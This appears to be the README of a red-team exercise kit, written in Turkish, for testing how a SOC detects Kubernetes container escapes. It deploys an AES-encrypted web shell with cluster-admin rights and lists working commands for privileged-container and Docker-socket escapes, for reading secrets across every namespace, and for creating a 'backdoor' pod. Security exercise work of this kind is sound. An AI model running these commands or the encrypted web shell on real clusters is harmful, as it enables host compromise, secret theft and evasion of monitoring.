# K8s Pentest Tatbikat Ortami

> **UYARI:** Bu proje yalnizca yetkili guvenlik tatbikatlari icin tasarlanmistir.
> Yetkisiz kullanim yasaktir. Kullanmadan once gerekli onaylari aliniz.

## Genel Bakis

SOC ekibinin Kubernetes ortaminda container escape saldirilarini tespit ve mudahale
yetenegini olcmek icin olusturulmus red team tatbikat arac setidir. Iki farkli container
escape senaryosu icerir:

| Senaryo | Dosya | Zafiyet |
|---------|-------|---------|
| 1 - Privileged | `docker-compose-privileged.yml` | `privileged: true` ile tam host erisimi |
| 2 - Socket | `docker-compose-socket.yml` | Docker socket mount ile container olusturma |

## On Gereksinimler

- Docker & Docker Compose
- kubectl (Anthos cluster erisimi icin)
- Google Anthos cluster (local)

## Hizli Baslangic

### 1. Image Olusturma

```bash
docker build -t pentest-webshell:latest .
```

### 2a. Senaryo 1 - Privileged Container

```bash
docker compose -f docker-compose-privileged.yml up -d
```

### 2b. Senaryo 2 - Docker Socket Mount

```bash
docker compose -f docker-compose-socket.yml up -d
```

### 3. Web Shell Erisimi

Tarayicida `http://<HOST_IP>:8080` adresine gidin. Terminal arayuzunden komut calistirabilirsiniz.
Tum girdi/cikti AES-256-GCM ile sifrelenmistir.

## Kubernetes Uzerinde Calistirma (Anthos)

```bash
# Namespace, Service ve RBAC olustur
kubectl apply -f k8s/service.yml
kubectl apply -f k8s/rbac.yml

# Senaryo 1: Privileged pod
kubectl apply -f k8s/deployment-privileged.yml

# veya Senaryo 2: Socket mount pod
kubectl apply -f k8s/deployment-socket.yml
```

Web shell'e `http://<NODE_IP>:30080` uzerinden erisilir.

## Saldiri Senaryolari

### Senaryo 1: Privileged Container Escape

Container icinden asagidaki komutlarla host'a erisim saglanabilir:

```bash
# Host disklerini listele
fdisk -l

# Host filesystem'i mount et
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Host'a escape
chroot /mnt/host

# Alternatif: nsenter ile host namespace'ine gecis
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Senaryo 2: Docker Socket Escape

Container icinden Docker socket uzerinden yeni container olusturulabilir:

```bash
# Host uzerindeki container'lari listele
docker ps

# Host image'larini listele
docker images

# Host filesystem'e erisimli yeni container olustur
docker run -v /:/host --privileged -it ubuntu chroot /host
```

### Kubernetes Lateral Movement (Her iki senaryo)

Pod icinden kubectl ile cluster yonetimi (cluster-admin RBAC sayesinde):

```bash
# Cluster bilgisi
kubectl cluster-info
kubectl get nodes

# Tum namespace'lerdeki pod'lari listele
kubectl get pods --all-namespaces

# Secret'lari oku
kubectl get secrets --all-namespaces
kubectl get secret <name> -n <ns> -o yaml

# Yeni pod olustur
kubectl run backdoor --image=ubuntu --command -- sleep infinity
```

## Sifreleme Detaylari

- **Algoritma:** AES-256-GCM (authenticated encryption)
- **Key:** 32-byte hex string (environment variable ile degistirilebilir)
- **Nonce:** Her istekte rastgele 12-byte
- **Frontend:** Web Crypto API (native browser sifreleme)
- **Backend:** PyCryptodome

### AES Key Degistirme

```bash
# Environment variable ile
WEBSHELL_AES_KEY=<64_hex_karakter> docker compose -f docker-compose-privileged.yml up -d
```

## Yapilandirma

| Degisken | Varsayilan | Aciklama |
|----------|-----------|----------|
| `WEBSHELL_AES_KEY` | (hardcoded) | 64 hex karakter AES-256 anahtari |
| `WEBSHELL_HOST` | `0.0.0.0` | Dinlenecek IP |
| `WEBSHELL_PORT` | `8080` | Dinlenecek port |
| `WEBSHELL_SHELL` | `/bin/bash` | Kullanilacak shell |
| `WEBSHELL_TIMEOUT` | `30` | Komut zaman asimi (saniye) |

## Temizlik

### Docker Compose

```bash
docker compose -f docker-compose-privileged.yml down
docker compose -f docker-compose-socket.yml down
docker rmi pentest-webshell:latest
```

### Kubernetes

```bash
kubectl delete -f k8s/deployment-privileged.yml
kubectl delete -f k8s/deployment-socket.yml
kubectl delete -f k8s/rbac.yml
kubectl delete -f k8s/service.yml
```

## Dosya Yapisi

```
├── Dockerfile                         # Ubuntu 22.04 + kubectl + ssh + web shell
├── docker-compose-privileged.yml      # Senaryo 1: Privileged container
├── docker-compose-socket.yml          # Senaryo 2: Docker socket mount
├── k8s/
│   ├── deployment-privileged.yml      # Privileged pod manifest
│   ├── deployment-socket.yml          # Socket mount pod manifest
│   ├── service.yml                    # Namespace + NodePort (30080)
│   └── rbac.yml                       # ServiceAccount + cluster-admin binding
├── app/
│   ├── server.py                      # Flask backend (AES-256-GCM + subprocess)
│   ├── requirements.txt               # Python dependencies
│   └── templates/
│       └── index.html                 # Terminal UI (Web Crypto API)
├── senaryo.md                         # Saldiri senaryolari ve kullanim kilavuzu
└── README.md                          # Proje aciklamasi ve yasal uyarilar (EN)
```
